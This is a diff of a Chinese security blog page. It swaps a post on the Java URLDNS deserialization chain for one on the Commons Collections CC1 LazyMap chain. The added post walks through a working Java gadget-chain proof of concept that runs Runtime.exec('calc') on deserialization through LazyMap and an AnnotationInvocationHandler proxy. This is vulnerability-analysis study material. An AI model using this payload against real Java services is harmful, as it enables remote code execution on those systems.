@@ -16,33 +16,25 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一条简单的反序列化链">
+    <meta name="description" content="之前分析了TransformMap那条链，现在分析一下LazyMap">
 <meta property="og:type" content="article">
-<meta property="og:title" content="URLDNS链分析">
-<meta property="og:url" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="CC1链lazyMap">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/08/13/CC1%E9%93%BElazyMap/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="一条简单的反序列化链">
+<meta property="og:description" content="之前分析了TransformMap那条链，现在分析一下LazyMap">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151237155.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153145840.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153240256.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153356053.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153803170.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904154018970.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151737711.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904152213420.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904155628133.png">
-<meta property="article:published_time" content="2024-09-04T06:17:36.000Z">
-<meta property="article:modified_time" content="2024-09-04T08:00:50.409Z">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/13/CC1%E9%93%BElazyMap/image-20240913202953660.png">
+<meta property="article:published_time" content="2024-08-13T07:25:33.000Z">
+<meta property="article:modified_time" content="2024-09-13T12:43:33.156Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="漏洞分析">
 <meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151237155.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/08/13/CC1%E9%93%BElazyMap/image-20240913202953660.png">
   
   
   
-  <title>URLDNS链分析 - 3xsh0re&#39;Blog</title>
+  <title>CC1链lazyMap - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -361,7 +353,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="URLDNS链分析"></span>
+            <span id="subtitle" data-typed-text="CC1链lazyMap"></span>
           
         </div>
 
@@ -372,8 +364,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-04 14:17" pubdate>
-          2024年9月4日 下午
+        <time datetime="2024-08-13 15:25" pubdate>
+          2024年8月13日 下午
         </time>
       </span>
     
@@ -384,7 +376,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          3.1k 字
         
       </span>
     
@@ -395,7 +387,7 @@ mjx-container[display="true"] + br {
         
         
         
-          7 分钟
+          20 分钟
         
       </span>
     
@@ -440,12 +432,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">URLDNS链分析</h1>
+            <h1 id="seo-header">CC1链lazyMap</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年9月4日 下午
+                    本文最后更新于：2024年9月13日 晚上
                   
                 
               </p>
@@ -453,47 +445,31 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>一条简单的反序列化链</p>
+                <p>之前分析了<code>TransformMap</code>那条链，现在分析一下<code>LazyMap</code></p>
 <span id="more"></span>
 
-<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>从<code>ysoserial</code>的源码开始调试，直接在Github下载其源码导入IDEA，Maven会自动加载需要的包。</p>
-<p>直接看到URLDNS.java的文件，我们关注<code>getObject</code>函数里面的这两个代码，说明使用的是<code>HashMap</code>，并且将URL作为其中的键值对造成的反序列化问题</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151237155.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904151237155">
+<p><code>LazyMap</code>这条链子是<code>ysoserial</code>在使用，其同样在<code>org.apache.commons.collections.map</code>路径下，我在其源码中可以看到，在<code>get</code>方法中调用了<code>transform()</code>这个函数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) {<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    }<br>    <span class="hljs-keyword">return</span> map.get(key);<br>}<br></code></pre></td></tr></table></figure>
 
-<p>为了方便调试，做一下准备，首先进入URL类中，找到hashCode函数，然后点击<code>handler.hashCode()</code>进去，</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153145840.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904153145840">
+<p>现在我们找到了最底层的出发点，现在向上查看对<code>LayMap.get()</code>的调用，可以发现有一大堆，直接看看<code>ysoserial</code>里面是怎么设计的，还是使用了<code>AnnotationInvocationHandler</code>这个类，但是并不是在它的<code>readObject</code>函数中了，搜索一下<code>get</code>，在77行的位置，<code>invoke</code>函数中调用了Map类的<code>get</code>函数，而<code>LazyMap</code>显然是继承<code>Map</code>类的。</p>
+<p>下一个问题是，如何使用<code>AnnotationInvocationHandler</code>的<code>invoke</code>函数，从这个类的注释中可以发现，它是对注解调用处理的动态代理实现。关于动态代理可以看看JavaSec的这篇文章，<a target="_blank" rel="noopener" href="https://www.javasec.org/javase/DynamicProxy/DynamicProxy.html">Java动态代理</a></p>
+<p>在<code>ysoserial</code>中也是使用了动态代理的方法进行的构造，创建动态代理类会使用到<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。<code>java.lang.reflect.Proxy</code>主要用于生成动态代理类<code>Class</code>、创建代理类实例。</p>
+<p>创建动态代理实例代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br><span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br></code></pre></td></tr></table></figure>
 
-<p>在353行处打下断点，这也真是请求DNS解析的地方</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153240256.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904153240256">
+<p><code>Proxy.newProxyInstance</code>的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑。<strong>被代理的接口类通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果</strong>。</p>
+<p>根据构造的需要，要触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>，对其进行动态代理，再调用任意函数就可以了，调用函数简单，反序列化自动会调用<code>Map</code>的一些函数。</p>
+<p>所以根据<code>TransformMap</code>的链子我们可以写出<code>lazyMap</code>的链子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(tfs);<br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"3xsh0re"</span>);<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,transformerChain);<br><span class="hljs-comment">//        获取类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        对Map创建代理,使用AnnotationInvocationHandler进行代理</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br><span class="hljs-comment">//        对proxyMap进行再封装,因为我们需要的是AnnotationInvocationHandler的readObject</span><br>        handler = (InvocationHandler) constructor.newInstance(Target.class,proxyMap);<br><br><span class="hljs-comment">//        测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
-<p>然后回到URLDNS.java中，修改main函数为下面这样：</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153356053.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904153356053">
+<p>我自己的payload在调试过程中会弹出很多次计算器，因为被代理后，只要使用<code>Map</code>相关的函数就会到<code>invoke</code>。调试器会调用一些toString之类的方法，导致不经意间触发了 命令。<code>ysoserial</code>对此有一些处理，它在POC的最后才将执行命令的<code>Transformer</code>数组设置到<code>transformerChain</code>中，原因是避免本地生成序列化流的程序执行到命令。可以发现<code>ysoserial</code>实现了一个工具类去处理这种情况。</p>
+<img src="/2024/08/13/CC1%E9%93%BElazyMap/image-20240913202953660.png" srcset="/img/loading.gif" lazyload class="" title="image-20240913202953660">
 
-<p>然后我们进行调试，<strong>可以发现会多次进入我们打断点的地方但没有发出请求，这是为什么呢，是因为ysoserial自己重写了这个地方</strong>，修改返回值为null所以无事发生。</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153803170.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904153803170">
-
-<p>大概3次步进，再次到我们打断点的地方，查看调用栈：</p>
-<p><code>HashMap.readObject()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode()</code></p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904154018970.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904154018970">
-
-<p>于是我们查看HashMap类，我们知道Java反序列化问题的造成都是因为不安全的重写<code>readObject</code>函数造成的，所以搜索<code>readObject</code>函数</p>
-<p>都是会先调用一个默认的<code>readObject</code>然后后面写自己的逻辑，</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151737711.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>在1397行的位置，可以看到使用了<code>putVal(hash(key), key, value, false, false);</code>这个语句，对key进行了hash运算，我们这里的key就是URL类，在此处下断点，重新调试。</p>
-<p>步进查看<code>hash</code>这个方法，它是继续调用了<code>key.hashCode()</code>来计算，也就是我们这里的<code>URL.hashCode()</code></p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904152213420.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904152213420">
-
-<p>于是继续触发<code>URLStreamHandler.hashCode()</code>，最终到<code>URLStreamHandler.getHostAddress()</code>就发出了DNS请求。</p>
-<img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904155628133.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904155628133">
-
-<p>总的来说，这条链子很简单但很重要，因为它<strong>不需要依赖其他包，仅仅使用了原生的Java包，主要是用来检测是否存在反序列化漏洞</strong>。</p>
-<p><code>HashMap.readObject()</code></p>
-<p><code>-&gt;HashMap.hash()</code></p>
-<p><code>-&gt;URL.hashCode()</code></p>
-<p><code>-&gt;URLStreamHandler.hashCode()</code></p>
-<p><code>-&gt;URLStreamHandler.getHostAddress()</code></p>
-<p><code>-&gt;InetAddress.getByName()</code></p>
+<p>最后来捋一捋这个逻辑：</p>
+<p><code>AnnotationInvocationHandler</code>封装<code>proxyMap</code>从而可以被序列化</p>
+<p><code>AnnotationInvocationHandler</code>代理<code>Map.class</code>从而可以触发<code>invoke</code>函数</p>
+<p>构造的<code>AnnotationInvocationHandler</code>实例中，<code>lazyMap</code>作为成员变量被传入，在<code>invoke</code>函数中调用<code>get</code>函数</p>
+<p>在<code>lazyMap.get()</code>中调用<code>transform</code></p>
 
                 
               </div>
@@ -541,8 +517,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>URLDNS链分析</div>
-      <div>https://3xsh0re.github.io/2024/09/04/URLDNS链分析/</div>
+      <div>CC1链lazyMap</div>
+      <div>https://3xsh0re.github.io/2024/08/13/CC1链lazyMap/</div>
     </div>
     <div class="license-meta">
       
@@ -554,7 +530,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年9月4日</div>
+          <div>2024年8月13日</div>
         </div>
       
       
@@ -586,9 +562,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/" title="长城杯初赛MISC">
+                      <a href="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">长城杯初赛MISC</span>
+                        <span class="hidden-mobile">URLDNS链分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -596,8 +572,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/08/13/CC1%E9%93%BElazyMap/" title="CC1链lazyMap">
-                        <span class="hidden-mobile">CC1链lazyMap</span>
+                      <a href="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/" title="JSPWebShell小记">
+                        <span class="hidden-mobile">JSPWebShell小记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
